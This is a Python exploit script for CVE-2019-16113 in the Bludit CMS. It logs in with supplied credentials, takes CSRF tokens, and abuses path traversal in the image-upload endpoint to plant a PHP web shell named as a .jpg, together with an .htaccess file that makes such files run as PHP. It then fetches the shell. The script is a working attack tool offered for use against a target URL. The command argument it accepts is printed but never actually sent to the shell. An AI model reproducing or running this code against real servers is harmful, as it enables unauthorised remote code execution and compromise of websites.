import requests
import re
import argparse
from log_colors import *
import random
import string
import base64

# CVE-2019-16113
class CVE2019_16113():
    def __init__(self, url, usr, pswd, cmd):
        self.url = url
        self.usr, self.pswd = usr, pswd
        self.cmd = cmd
        self.session = requests.Session()
        self.headers = {
            "Origin" : self.url,
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" : "en-US,en;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests" : "1",
            "Connection" : "close",
            "Referer" : self.url + "/admin",
        }
        self.ajax_headers = {
            "Origin" : self.url,
            "Accept" : "*/*",
            "X-Requested-With" : "XMLHttpRequest",
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Connection" : "close",
            "Referer" : self.url + "/admin/new-content",
            "Accept-Language" : "q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding" : "gzip, deflate"
        }
        self.webshell = self.rnd() + ".jpg"

    # get random string
    def rnd(self):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(8))

    # login logic
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        r = self.session.get(self.url + "/admin")
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', r.text).group(1)
        print (LogColors.YELLOW + "csrf: " + csrf_token + LogColors.ENDC)
        la_cookie = ((r.headers['Set-Cookie']).split(";")[0].split("=")[1])
        data = {
            "save" : "",
            "username" : self.usr,
            "password" : self.pswd,
            "tokenCSRF" : csrf_token,
        }
        cookies = {"BLUDIT-KEY" : la_cookie}
        r = self.session.post(
            self.url + "/admin/",
            data = data, headers = self.headers, cookies = cookies, allow_redirects = False
        )
        print (LogColors.YELLOW + "cookie: " + la_cookie + LogColors.ENDC)
        self.la_cookie = la_cookie
        return la_cookie

    # get csrf token
    def csrf_token(self):
        print (LogColors.BLUE + "csrf..." + LogColors.ENDC)
        cookies = {"BLUDIT-KEY" : self.la_cookie}
        r = self.session.get(
            self.url + "/admin/dashboard",
            headers = self.headers, cookies = cookies
        )
        token = r.text.split('var tokenCSRF = "')[1].split('"')[0]
        print (LogColors.YELLOW + "csrf token: " + token + LogColors.ENDC)
        return token
    
    def upload_shell(self, la_cookie, token):
        print (LogColors.BLUE + "upload shell..." + LogColors.ENDC)
        data = {"uuid" : "../../tmp", "tokenCSRF" : token}
        data_files = [('images[]', (self.webshell, "<?php system($_GET['cmd']); ?>", 'application/octet-stream'))]
        cookies = {"BLUDIT-KEY" : la_cookie}
        r = self.session.post(
            self.url + '/admin/ajax/upload-images',
            data = data, files = data_files, headers = self.ajax_headers, cookies = cookies
        )
        print (LogColors.YELLOW + "shell: " + self.webshell + "..." + LogColors.ENDC)
    
    def upload_htaccess(self, la_cookie, token):
        print (LogColors.BLUE + "upload htaccess..." + LogColors.ENDC)
        data = {"uuid" : "../../tmp", "tokenCSRF" : token}
        data_files = [
            ('images[]', ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .jpg", 'application/octet-stream'))
        ]
        cookies = {"BLUDIT-KEY" : la_cookie}
        r = self.session.post(
            self.url + '/admin/ajax/upload-images',
            data = data, files = data_files, headers = self.ajax_headers, cookies = cookies
        )
        print (LogColors.YELLOW + "htaccess: OK..." + LogColors.ENDC)

    # exploit
    def run(self):
        la_cookie = self.login()
        token = self.csrf_token()
        self.upload_shell(la_cookie, token)
        self.upload_htaccess(la_cookie, token)
        print (LogColors.BLUE + "run..." + LogColors.ENDC)
        self.session = requests.Session()
        headers = {
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Upgrade-Insecure-Requests" : "1",
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Connection" : "close",
            "Accept-Language" : "en-US;q=0.5,en;q=0.3",
            "Accept-Encoding" : "gzip, deflate"
        }
        try:
            url = self.url + "/bl-content/tmp/" + self.webshell
            r = self.session.get(url, headers = headers)
            print (LogColors.YELLOW + self.url + "..." + LogColors.ENDC)
            print (LogColors.YELLOW + "executing command: " + self.cmd + LogColors.ENDC)
            print (LogColors.YELLOW + str(r.status_code) + LogColors.ENDC)
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
        except Exception:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-usr', '--username', required = True, help = "username")
    parser.add_argument('-pswd', '--password', required = True, help = "password")
    parser.add_argument('-c', '--cmd', required = True, help = "command to execute")
    args = vars(parser.parse_args())
    url = args['url']
    usr, pswd = args['username'], args['password']
    cmd = args['cmd']
    cve = CVE2019_16113(url, usr, pswd, cmd)
    cve.run()

